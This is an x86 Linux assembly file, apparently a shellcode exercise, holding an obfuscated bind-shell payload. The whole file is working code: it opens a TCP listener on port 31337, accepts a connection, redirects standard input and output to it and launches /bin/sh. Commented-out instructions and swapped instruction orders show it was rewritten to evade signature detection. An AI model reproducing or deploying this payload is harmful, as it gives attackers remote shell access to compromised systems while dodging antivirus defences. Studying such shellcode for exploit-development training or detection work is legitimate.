;
; ; Filename: shell-bind-tcp_ofuscated.asm
; Author    Fernando Benedictti
;

global _start

segment .text
_start:
;  xor    eax,eax
  xor    ebx,ebx
  mul    ebx              ;EAX=0
  xor    ecx,ecx
;  xor    edx,edx
  cdq                     ;EDX=0

  mov    al,0x66

;  mov    bl,0x1
  inc    ebx

  push   ecx
  push   0x6
  push   0x1
  push   0x2
  mov    ecx,esp
  int    0x80
  mov    esi,eax

  ;order of instructions swapped
;  mov    bl,0x2
  inc    ebx
  mov    al,0x66

  push   edx
  push   word 0x697a
  push   bx
  mov    ecx,esp
  push   0x10
  push   ecx
  push   esi
  mov    ecx,esp
  int    0x80

  ;order of instructions swapped
  mov    bl,0x4
  mov    al,0x66

  push   0x1
  push   esi
  mov    ecx,esp
  int    0x80

  ;order of instructions swapped
;  mov    bl,0x5
  inc    ebx
  mov    al,0x66

  push   edx
  push   edx
  push   esi
  mov    ecx,esp
  int    0x80
  mov    ebx,eax
  xor    ecx,ecx
  mov    cl,0x3

dupfd:
  dec    cl
  mov    al,0x3f
  int    0x80
  jne    dupfd

;  xor    eax,eax
  mul    edx

  push   edx
  push   0x68732f6e
  push   0x69622f2f
  mov    ebx,esp
  push   edx
  push   ebx
  mov    ecx,esp
  push   edx
  mov    edx,esp
  mov    al,0xb
  int    0x80
